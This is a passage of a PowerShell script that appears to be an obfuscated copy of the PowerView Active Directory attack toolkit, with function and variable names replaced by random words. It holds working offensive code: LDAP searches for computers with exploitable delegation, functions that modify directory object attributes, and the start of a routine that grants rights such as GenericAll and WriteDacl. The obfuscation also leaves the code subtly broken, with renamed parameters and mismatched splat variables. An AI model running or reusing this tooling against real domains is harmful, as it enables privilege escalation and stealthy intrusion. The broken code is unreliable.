            $kXbEpVCq99 = ''
            $BfpbWwpi99 | Where-Object {$_} | ForEach-Object {
                $QghnbJOP99 = $_.Replace('(', '\28').Replace(')', '\29')
                if ($QghnbJOP99 -match '^S-1-') {
                    $afFJXkRc99 += "(objectsid=$QghnbJOP99)"
                }
                elseif ($QghnbJOP99 -match '^CN=') {
                    $afFJXkRc99 += "(distinguishedname=$QghnbJOP99)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        $BvhyhWZG99 = $QghnbJOP99.SubString($QghnbJOP99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[doubtlessly] Extracted domain '$BvhyhWZG99' from '$QghnbJOP99'"
                        $PPosolen99['Domain'] = $BvhyhWZG99
                        $fTlnGmRy99 = watersides @SearcherArguments
                        if (-not $fTlnGmRy99) {
                            Write-Warning "[doubtlessly] Unable to retrieve domain searcher for '$BvhyhWZG99'"
                        }
                    }
                }
                elseif ($QghnbJOP99.Contains('.')) {
                    $afFJXkRc99 += "(|(name=$QghnbJOP99)(dnshostname=$QghnbJOP99))"
                }
                elseif ($QghnbJOP99 -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    $DwsqqDxI99 = (([Guid]$QghnbJOP99).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                    $afFJXkRc99 += "(objectguid=$DwsqqDxI99)"
                }
                else {
                    $afFJXkRc99 += "(name=$QghnbJOP99)"
                }
            }
            if ($afFJXkRc99 -and ($afFJXkRc99.Trim() -ne '') ) {
                $kXbEpVCq99 += "(|$afFJXkRc99)"
            }
            if ($PSBoundParameters['Unconstrained']) {
                Write-Verbose '[doubtlessly] Searching for computers with for unconstrained delegation'
                $kXbEpVCq99 += '(userAccountControl:1.2.840.113556.1.4.803:=524288)'
            }
            if ($PSBoundParameters['TrustedToAuth']) {
                Write-Verbose '[doubtlessly] Searching for computers that are trusted to authenticate for other principals'
                $kXbEpVCq99 += '(msds-allowedtodelegateto=*)'
            }
            if ($PSBoundParameters['Printers']) {
                Write-Verbose '[doubtlessly] Searching for printers'
                $kXbEpVCq99 += '(objectCategory=printQueue)'
            }
            if ($PSBoundParameters['SPN']) {
                Write-Verbose "[doubtlessly] Searching for computers with SPN: $SPN"
                $kXbEpVCq99 += "(servicePrincipalName=$SPN)"
            }
            if ($PSBoundParameters['OperatingSystem']) {
                Write-Verbose "[doubtlessly] Searching for computers with operating system: $wSsSBiPZ99"
                $kXbEpVCq99 += "(operatingsystem=$wSsSBiPZ99)"
            }
            if ($PSBoundParameters['ServicePack']) {
                Write-Verbose "[doubtlessly] Searching for computers with service pack: $qoqQUCpy99"
                $kXbEpVCq99 += "(operatingsystemservicepack=$qoqQUCpy99)"
            }
            if ($PSBoundParameters['SiteName']) {
                Write-Verbose "[doubtlessly] Searching for computers with site name: $nqApdsmI99"
                $kXbEpVCq99 += "(serverreferencebl=$nqApdsmI99)"
            }
            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[doubtlessly] Using additional LDAP filter: $HOOTOEqu99"
                $kXbEpVCq99 += "$HOOTOEqu99"
            }
            $RWjhpIuk99 | Where-Object {$_} | ForEach-Object {
                if ($_ -match 'NOT_.*') {
                    $aHFybRCW99 = $_.Substring(4)
                    $FXxXILfT99 = [Int]($oqUiXgaF99::$aHFybRCW99)
                    $kXbEpVCq99 += "(!(userAccountControl:1.2.840.113556.1.4.803:=$FXxXILfT99))"
                }
                else {
                    $FXxXILfT99 = [Int]($oqUiXgaF99::$_)
                    $kXbEpVCq99 += "(userAccountControl:1.2.840.113556.1.4.803:=$FXxXILfT99)"
                }
            }
            $fTlnGmRy99.filter = "(&(samAccountType=805306369)$kXbEpVCq99)"
            Write-Verbose "[doubtlessly] doubtlessly filter string: $($fTlnGmRy99.filter)"
            if ($PSBoundParameters['FindOne']) { $pfqXXMQd99 = $fTlnGmRy99.FindOne() }
            else { $pfqXXMQd99 = $fTlnGmRy99.FindAll() }
            $pfqXXMQd99 | Where-Object {$_} | ForEach-Object {
                $Up = $True
                if ($PSBoundParameters['Ping']) {
                    $Up = Test-Connection -Count 1 -Quiet -ComputerName $_.properties.dnshostname
                }
                if ($Up) {
                    if ($PSBoundParameters['Raw']) {
                        $cXOPCAwl99 = $_
                        $cXOPCAwl99.PSObject.TypeNames.Insert(0, 'PowerView.Computer.Raw')
                    }
                    else {
                        $cXOPCAwl99 = Buddy -Properties $_.Properties
                        $cXOPCAwl99.PSObject.TypeNames.Insert(0, 'PowerView.Computer')
                    }
                    $cXOPCAwl99
                }
            }
            if ($pfqXXMQd99) {
                try { $pfqXXMQd99.dispose() }
                catch {
                    Write-Verbose "[doubtlessly] Error disposing of the Results object: $_"
                }
            }
            $fTlnGmRy99.dispose()
        }
    }
}
function farrowing {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.ADObject')]
    [OutputType('PowerView.ADObject.Raw')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $BfpbWwpi99,
        [ValidateNotNullOrEmpty()]
        [String]
        $SSNUOPgW99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $HOOTOEqu99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $SdzJuWMG99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $FNgTGwmR99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $mSxqoOjK99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $vaSWXjPs99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $mhcqrrQn99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $mvTbAWDU99,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $tmZARvdq99,
        [Switch]
        $rPozaKft99,
        [Alias('ReturnOne')]
        [Switch]
        $QtcSidjx99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $gxazvivN99 = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    DynamicParam {
        $aButQqsr99 = [Enum]::GetNames($oqUiXgaF99)
        $aButQqsr99 = $aButQqsr99 | ForEach-Object {$_; "NOT_$_"}
        coup -Name UACFilter -ValidateSet $aButQqsr99 -Type ([array])
    }
    BEGIN {
        $PPosolen99 = @{}
        if ($PSBoundParameters['Domain']) { $PPosolen99['Domain'] = $SSNUOPgW99 }
        if ($PSBoundParameters['Properties']) { $PPosolen99['Properties'] = $SdzJuWMG99 }
        if ($PSBoundParameters['SearchBase']) { $PPosolen99['SearchBase'] = $FNgTGwmR99 }
        if ($PSBoundParameters['Server']) { $PPosolen99['Server'] = $mSxqoOjK99 }
        if ($PSBoundParameters['SearchScope']) { $PPosolen99['SearchScope'] = $vaSWXjPs99 }
        if ($PSBoundParameters['ResultPageSize']) { $PPosolen99['ResultPageSize'] = $mhcqrrQn99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $PPosolen99['ServerTimeLimit'] = $mvTbAWDU99 }
        if ($PSBoundParameters['SecurityMasks']) { $PPosolen99['SecurityMasks'] = $tmZARvdq99 }
        if ($PSBoundParameters['Tombstone']) { $PPosolen99['Tombstone'] = $rPozaKft99 }
        if ($PSBoundParameters['Credential']) { $PPosolen99['Credential'] = $gxazvivN99 }
        $EihUhexc99 = watersides @SearcherArguments
    }
    PROCESS {
        if ($PSBoundParameters -and ($PSBoundParameters.Count -ne 0)) {
            coup -CreateVariables -BoundParameters $PSBoundParameters
        }
        if ($EihUhexc99) {
            $afFJXkRc99 = ''
            $kXbEpVCq99 = ''
            $BfpbWwpi99 | Where-Object {$_} | ForEach-Object {
                $QghnbJOP99 = $_.Replace('(', '\28').Replace(')', '\29')
                if ($QghnbJOP99 -match '^S-1-') {
                    $afFJXkRc99 += "(objectsid=$QghnbJOP99)"
                }
                elseif ($QghnbJOP99 -match '^(CN|OU|DC)=') {
                    $afFJXkRc99 += "(distinguishedname=$QghnbJOP99)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        $BvhyhWZG99 = $QghnbJOP99.SubString($QghnbJOP99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[farrowing] Extracted domain '$BvhyhWZG99' from '$QghnbJOP99'"
                        $PPosolen99['Domain'] = $BvhyhWZG99
                        $EihUhexc99 = watersides @SearcherArguments
                        if (-not $EihUhexc99) {
                            Write-Warning "[farrowing] Unable to retrieve domain searcher for '$BvhyhWZG99'"
                        }
                    }
                }
                elseif ($QghnbJOP99 -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    $DwsqqDxI99 = (([Guid]$QghnbJOP99).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                    $afFJXkRc99 += "(objectguid=$DwsqqDxI99)"
                }
                elseif ($QghnbJOP99.Contains('\')) {
                    $TzefbTEv99 = $QghnbJOP99.Replace('\28', '(').Replace('\29', ')') | kinsman -OutputType Canonical
                    if ($TzefbTEv99) {
                        $MUJwRPEg99 = $TzefbTEv99.SubString(0, $TzefbTEv99.IndexOf('/'))
                        $kYMQHBOP99 = $QghnbJOP99.Split('\')[1]
                        $afFJXkRc99 += "(samAccountName=$kYMQHBOP99)"
                        $PPosolen99['Domain'] = $MUJwRPEg99
                        Write-Verbose "[farrowing] Extracted domain '$MUJwRPEg99' from '$QghnbJOP99'"
                        $EihUhexc99 = watersides @SearcherArguments
                    }
                }
                elseif ($QghnbJOP99.Contains('.')) {
                    $afFJXkRc99 += "(|(samAccountName=$QghnbJOP99)(name=$QghnbJOP99)(dnshostname=$QghnbJOP99))"
                }
                else {
                    $afFJXkRc99 += "(|(samAccountName=$QghnbJOP99)(name=$QghnbJOP99)(displayname=$QghnbJOP99))"
                }
            }
            if ($afFJXkRc99 -and ($afFJXkRc99.Trim() -ne '') ) {
                $kXbEpVCq99 += "(|$afFJXkRc99)"
            }
            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[farrowing] Using additional LDAP filter: $HOOTOEqu99"
                $kXbEpVCq99 += "$HOOTOEqu99"
            }
            $RWjhpIuk99 | Where-Object {$_} | ForEach-Object {
                if ($_ -match 'NOT_.*') {
                    $aHFybRCW99 = $_.Substring(4)
                    $FXxXILfT99 = [Int]($oqUiXgaF99::$aHFybRCW99)
                    $kXbEpVCq99 += "(!(userAccountControl:1.2.840.113556.1.4.803:=$FXxXILfT99))"
                }
                else {
                    $FXxXILfT99 = [Int]($oqUiXgaF99::$_)
                    $kXbEpVCq99 += "(userAccountControl:1.2.840.113556.1.4.803:=$FXxXILfT99)"
                }
            }
            if ($kXbEpVCq99 -and $kXbEpVCq99 -ne '') {
                $EihUhexc99.filter = "(&$kXbEpVCq99)"
            }
            Write-Verbose "[farrowing] farrowing filter string: $($EihUhexc99.filter)"
            if ($PSBoundParameters['FindOne']) { $pfqXXMQd99 = $EihUhexc99.FindOne() }
            else { $pfqXXMQd99 = $EihUhexc99.FindAll() }
            $pfqXXMQd99 | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters['Raw']) {
                    $Object = $_
                    $Object.PSObject.TypeNames.Insert(0, 'PowerView.ADObject.Raw')
                }
                else {
                    $Object = Buddy -Properties $_.Properties
                    $Object.PSObject.TypeNames.Insert(0, 'PowerView.ADObject')
                }
                $Object
            }
            if ($pfqXXMQd99) {
                try { $pfqXXMQd99.dispose() }
                catch {
                    Write-Verbose "[farrowing] Error disposing of the Results object: $_"
                }
            }
            $EihUhexc99.dispose()
        }
    }
}
function pantheistic {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.ADObjectAttributeHistory')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $BfpbWwpi99,
        [ValidateNotNullOrEmpty()]
        [String]
        $SSNUOPgW99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $HOOTOEqu99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $SdzJuWMG99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $FNgTGwmR99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $mSxqoOjK99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $vaSWXjPs99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $mhcqrrQn99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $mvTbAWDU99,
        [Switch]
        $rPozaKft99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $gxazvivN99 = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    BEGIN {
        $PPosolen99 = @{
            'Properties'    =   'msds-replattributemetadata','distinguishedname'
            'Raw'           =   $True
        }
        if ($PSBoundParameters['Domain']) { $PPosolen99['Domain'] = $SSNUOPgW99 }
        if ($PSBoundParameters['LDAPFilter']) { $PPosolen99['LDAPFilter'] = $HOOTOEqu99 }
        if ($PSBoundParameters['SearchBase']) { $PPosolen99['SearchBase'] = $FNgTGwmR99 }
        if ($PSBoundParameters['Server']) { $PPosolen99['Server'] = $mSxqoOjK99 }
        if ($PSBoundParameters['SearchScope']) { $PPosolen99['SearchScope'] = $vaSWXjPs99 }
        if ($PSBoundParameters['ResultPageSize']) { $PPosolen99['ResultPageSize'] = $mhcqrrQn99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $PPosolen99['ServerTimeLimit'] = $mvTbAWDU99 }
        if ($PSBoundParameters['Tombstone']) { $PPosolen99['Tombstone'] = $rPozaKft99 }
        if ($PSBoundParameters['FindOne']) { $PPosolen99['FindOne'] = $QtcSidjx99 }
        if ($PSBoundParameters['Credential']) { $PPosolen99['Credential'] = $gxazvivN99 }
        if ($PSBoundParameters['Properties']) {
            $VhjUUHmm99 = $PSBoundParameters['Properties'] -Join '|'
        }
        else {
            $VhjUUHmm99 = ''
        }
    }
    PROCESS {
        if ($PSBoundParameters['Identity']) { $PPosolen99['Identity'] = $BfpbWwpi99 }
        farrowing @SearcherArguments | ForEach-Object {
            $HxrwipaH99 = $_.Properties['distinguishedname'][0]
            ForEach($gsLTSbEi99 in $_.Properties['msds-replattributemetadata']) {
                $pczMbpLs99 = [xml]$gsLTSbEi99 | Select-Object -ExpandProperty 'DS_REPL_ATTR_META_DATA' -ErrorAction SilentlyContinue
                if ($pczMbpLs99) {
                    if ($pczMbpLs99.pszAttributeName -Match $VhjUUHmm99) {
                        $ERfozkEO99 = New-Object PSObject
                        $ERfozkEO99 | Add-Member NoteProperty 'ObjectDN' $HxrwipaH99
                        $ERfozkEO99 | Add-Member NoteProperty 'AttributeName' $pczMbpLs99.pszAttributeName
                        $ERfozkEO99 | Add-Member NoteProperty 'LastOriginatingChange' $pczMbpLs99.ftimeLastOriginatingChange
                        $ERfozkEO99 | Add-Member NoteProperty 'Version' $pczMbpLs99.dwVersion
                        $ERfozkEO99 | Add-Member NoteProperty 'LastOriginatingDsaDN' $pczMbpLs99.pszLastOriginatingDsaDN
                        $ERfozkEO99.PSObject.TypeNames.Insert(0, 'PowerView.ADObjectAttributeHistory')
                        $ERfozkEO99
                    }
                }
                else {
                    Write-Verbose "[pantheistic] Error retrieving 'msds-replattributemetadata' for '$HxrwipaH99'"
                }
            }
        }
    }
}
function Christine {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.ADObjectLinkedAttributeHistory')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $BfpbWwpi99,
        [ValidateNotNullOrEmpty()]
        [String]
        $SSNUOPgW99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $HOOTOEqu99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $SdzJuWMG99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $FNgTGwmR99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $mSxqoOjK99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $vaSWXjPs99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $mhcqrrQn99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $mvTbAWDU99,
        [Switch]
        $rPozaKft99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $gxazvivN99 = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    BEGIN {
        $PPosolen99 = @{
            'Properties'    =   'msds-replvaluemetadata','distinguishedname'
            'Raw'           =   $True
        }
        if ($PSBoundParameters['Domain']) { $PPosolen99['Domain'] = $SSNUOPgW99 }
        if ($PSBoundParameters['LDAPFilter']) { $PPosolen99['LDAPFilter'] = $HOOTOEqu99 }
        if ($PSBoundParameters['SearchBase']) { $PPosolen99['SearchBase'] = $FNgTGwmR99 }
        if ($PSBoundParameters['Server']) { $PPosolen99['Server'] = $mSxqoOjK99 }
        if ($PSBoundParameters['SearchScope']) { $PPosolen99['SearchScope'] = $vaSWXjPs99 }
        if ($PSBoundParameters['ResultPageSize']) { $PPosolen99['ResultPageSize'] = $mhcqrrQn99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $PPosolen99['ServerTimeLimit'] = $mvTbAWDU99 }
        if ($PSBoundParameters['Tombstone']) { $PPosolen99['Tombstone'] = $rPozaKft99 }
        if ($PSBoundParameters['Credential']) { $PPosolen99['Credential'] = $gxazvivN99 }
        if ($PSBoundParameters['Properties']) {
            $VhjUUHmm99 = $PSBoundParameters['Properties'] -Join '|'
        }
        else {
            $VhjUUHmm99 = ''
        }
    }
    PROCESS {
        if ($PSBoundParameters['Identity']) { $PPosolen99['Identity'] = $BfpbWwpi99 }
        farrowing @SearcherArguments | ForEach-Object {
            $HxrwipaH99 = $_.Properties['distinguishedname'][0]
            ForEach($gsLTSbEi99 in $_.Properties['msds-replvaluemetadata']) {
                $pczMbpLs99 = [xml]$gsLTSbEi99 | Select-Object -ExpandProperty 'DS_REPL_VALUE_META_DATA' -ErrorAction SilentlyContinue
                if ($pczMbpLs99) {
                    if ($pczMbpLs99.pszAttributeName -Match $VhjUUHmm99) {
                        $ERfozkEO99 = New-Object PSObject
                        $ERfozkEO99 | Add-Member NoteProperty 'ObjectDN' $HxrwipaH99
                        $ERfozkEO99 | Add-Member NoteProperty 'AttributeName' $pczMbpLs99.pszAttributeName
                        $ERfozkEO99 | Add-Member NoteProperty 'AttributeValue' $pczMbpLs99.pszObjectDn
                        $ERfozkEO99 | Add-Member NoteProperty 'TimeCreated' $pczMbpLs99.ftimeCreated
                        $ERfozkEO99 | Add-Member NoteProperty 'TimeDeleted' $pczMbpLs99.ftimeDeleted
                        $ERfozkEO99 | Add-Member NoteProperty 'LastOriginatingChange' $pczMbpLs99.ftimeLastOriginatingChange
                        $ERfozkEO99 | Add-Member NoteProperty 'Version' $pczMbpLs99.dwVersion
                        $ERfozkEO99 | Add-Member NoteProperty 'LastOriginatingDsaDN' $pczMbpLs99.pszLastOriginatingDsaDN
                        $ERfozkEO99.PSObject.TypeNames.Insert(0, 'PowerView.ADObjectLinkedAttributeHistory')
                        $ERfozkEO99
                    }
                }
                else {
                    Write-Verbose "[Christine] Error retrieving 'msds-replvaluemetadata' for '$HxrwipaH99'"
                }
            }
        }
    }
}
function backlashes {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $BfpbWwpi99,
        [ValidateNotNullOrEmpty()]
        [Alias('Replace')]
        [Hashtable]
        $Set,
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $XOR,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Clear,
        [ValidateNotNullOrEmpty()]
        [String]
        $SSNUOPgW99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $HOOTOEqu99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $FNgTGwmR99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $mSxqoOjK99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $vaSWXjPs99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $mhcqrrQn99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $mvTbAWDU99,
        [Switch]
        $rPozaKft99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $gxazvivN99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $PPosolen99 = @{'Raw' = $True}
        if ($PSBoundParameters['Domain']) { $PPosolen99['Domain'] = $SSNUOPgW99 }
        if ($PSBoundParameters['LDAPFilter']) { $PPosolen99['LDAPFilter'] = $HOOTOEqu99 }
        if ($PSBoundParameters['SearchBase']) { $PPosolen99['SearchBase'] = $FNgTGwmR99 }
        if ($PSBoundParameters['Server']) { $PPosolen99['Server'] = $mSxqoOjK99 }
        if ($PSBoundParameters['SearchScope']) { $PPosolen99['SearchScope'] = $vaSWXjPs99 }
        if ($PSBoundParameters['ResultPageSize']) { $PPosolen99['ResultPageSize'] = $mhcqrrQn99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $PPosolen99['ServerTimeLimit'] = $mvTbAWDU99 }
        if ($PSBoundParameters['Tombstone']) { $PPosolen99['Tombstone'] = $rPozaKft99 }
        if ($PSBoundParameters['Credential']) { $PPosolen99['Credential'] = $gxazvivN99 }
    }
    PROCESS {
        if ($PSBoundParameters['Identity']) { $PPosolen99['Identity'] = $BfpbWwpi99 }
        $FHZdVnWh99 = farrowing @SearcherArguments
        ForEach ($Object in $FHZdVnWh99) {
            $Entry = $FHZdVnWh99.GetDirectoryEntry()
            if($PSBoundParameters['Set']) {
                try {
                    $PSBoundParameters['Set'].GetEnumerator() | ForEach-Object {
                        Write-Verbose "[backlashes] Setting '$($_.Name)' to '$($_.Value)' for object '$($FHZdVnWh99.Properties.samaccountname)'"
                        $Entry.put($_.Name, $_.Value)
                    }
                    $Entry.commitchanges()
                }
                catch {
                    Write-Warning "[backlashes] Error setting/replacing properties for object '$($FHZdVnWh99.Properties.samaccountname)' : $_"
                }
            }
            if($PSBoundParameters['XOR']) {
                try {
                    $PSBoundParameters['XOR'].GetEnumerator() | ForEach-Object {
                        $WvaSMHXh99 = $_.Name
                        $vlAIDdgk99 = $_.Value
                        Write-Verbose "[backlashes] XORing '$WvaSMHXh99' with '$vlAIDdgk99' for object '$($FHZdVnWh99.Properties.samaccountname)'"
                        $dulUfSqM99 = $Entry.$WvaSMHXh99[0].GetType().name
                        $iJggqKLY99 = $($Entry.$WvaSMHXh99) -bxor $vlAIDdgk99
                        $Entry.$WvaSMHXh99 = $iJggqKLY99 -as $dulUfSqM99
                    }
                    $Entry.commitchanges()
                }
                catch {
                    Write-Warning "[backlashes] Error XOR'ing properties for object '$($FHZdVnWh99.Properties.samaccountname)' : $_"
                }
            }
            if($PSBoundParameters['Clear']) {
                try {
                    $PSBoundParameters['Clear'] | ForEach-Object {
                        $WvaSMHXh99 = $_
                        Write-Verbose "[backlashes] Clearing '$WvaSMHXh99' for object '$($FHZdVnWh99.Properties.samaccountname)'"
                        $Entry.$WvaSMHXh99.clear()
                    }
                    $Entry.commitchanges()
                }
                catch {
                    Write-Warning "[backlashes] Error clearing properties for object '$($FHZdVnWh99.Properties.samaccountname)' : $_"
                }
            }
        }
    }
}
function Michiganders {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.LogonHours')]
    [CmdletBinding()]
    Param (
        [Parameter( ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [byte[]]
        $BGKGrzXI99
    )
    Begin {
        if($BGKGrzXI99.Count -ne 21) {
            throw "LogonHoursArray is the incorrect length"
        }
        function regulating {
            Param (
                [int[]]
                $irSgbaxI99
            )
            $ufgHjSUU99 = New-Object bool[] 24
            for($i=0; $i -lt 3; $i++) {
                $Byte = $irSgbaxI99[$i]
                $KUsFrgdb99 = $i * 8
                $Str = [Convert]::ToString($Byte,2).PadLeft(8,'0')
                $ufgHjSUU99[$KUsFrgdb99+0] = [bool] [convert]::ToInt32([string]$Str[7])
                $ufgHjSUU99[$KUsFrgdb99+1] = [bool] [convert]::ToInt32([string]$Str[6])
                $ufgHjSUU99[$KUsFrgdb99+2] = [bool] [convert]::ToInt32([string]$Str[5])
                $ufgHjSUU99[$KUsFrgdb99+3] = [bool] [convert]::ToInt32([string]$Str[4])
                $ufgHjSUU99[$KUsFrgdb99+4] = [bool] [convert]::ToInt32([string]$Str[3])
                $ufgHjSUU99[$KUsFrgdb99+5] = [bool] [convert]::ToInt32([string]$Str[2])
                $ufgHjSUU99[$KUsFrgdb99+6] = [bool] [convert]::ToInt32([string]$Str[1])
                $ufgHjSUU99[$KUsFrgdb99+7] = [bool] [convert]::ToInt32([string]$Str[0])
            }
            $ufgHjSUU99
        }
    }
    Process {
        $ERfozkEO99 = @{
            Sunday = regulating -HoursArr $BGKGrzXI99[0..2]
            Monday = regulating -HoursArr $BGKGrzXI99[3..5]
            Tuesday = regulating -HoursArr $BGKGrzXI99[6..8]
            Wednesday = regulating -HoursArr $BGKGrzXI99[9..11]
            Thurs = regulating -HoursArr $BGKGrzXI99[12..14]
            Friday = regulating -HoursArr $BGKGrzXI99[15..17]
            Saturday = regulating -HoursArr $BGKGrzXI99[18..20]
        }
        $ERfozkEO99 = New-Object PSObject -Property $ERfozkEO99
        $ERfozkEO99.PSObject.TypeNames.Insert(0, 'PowerView.LogonHours')
        $ERfozkEO99
    }
}
function thickness {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.Security.AccessControl.AuthorizationRule')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True, Mandatory = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String]
        $yhJclZId99,
        [ValidateNotNullOrEmpty()]
        [String]
        $fcfzDfVI99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $mSxqoOjK99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $vaSWXjPs99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $mhcqrrQn99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $mvTbAWDU99,
        [Switch]
        $rPozaKft99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $gxazvivN99 = [Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $True)]
        [ValidateSet('AccessSystemSecurity', 'CreateChild','Delete','DeleteChild','DeleteTree','ExtendedRight','GenericAll','GenericExecute','GenericRead','GenericWrite','ListChildren','ListObject','ReadControl','ReadProperty','Self','Synchronize','WriteDacl','WriteOwner','WriteProperty')]
        $Right,
        [Parameter(Mandatory = $True, ParameterSetName='AccessRuleType')]
        [ValidateSet('Allow', 'Deny')]
        [String[]]
        $Ulxtslfm99,
        [Parameter(Mandatory = $True, ParameterSetName='AuditRuleType')]
        [ValidateSet('Success', 'Failure')]
        [String]
        $YtPCMRKx99,
        [Parameter(Mandatory = $False, ParameterSetName='AccessRuleType')]
        [Parameter(Mandatory = $False, ParameterSetName='AuditRuleType')]
        [Parameter(Mandatory = $False, ParameterSetName='ObjectGuidLookup')]
        [Guid]
        $XmSculID99,
        [ValidateSet('All', 'Children','Descendents','None','SelfAndChildren')]
        [String]
        $ARVPipoY99,
        [Guid]
        $pHXTVyEm99
    )
    Begin {
        if ($yhJclZId99 -notmatch '^S-1-.*') {
            $hBSkMWAr99 = @{
                'Identity' = $yhJclZId99
                'Properties' = 'distinguishedname,objectsid'
            }
            if ($PSBoundParameters['PrincipalDomain']) { $hBSkMWAr99['Domain'] = $fcfzDfVI99 }
            if ($PSBoundParameters['Server']) { $hBSkMWAr99['Server'] = $mSxqoOjK99 }
            if ($PSBoundParameters['SearchScope']) { $hBSkMWAr99['SearchScope'] = $vaSWXjPs99 }
            if ($PSBoundParameters['ResultPageSize']) { $hBSkMWAr99['ResultPageSize'] = $mhcqrrQn99 }
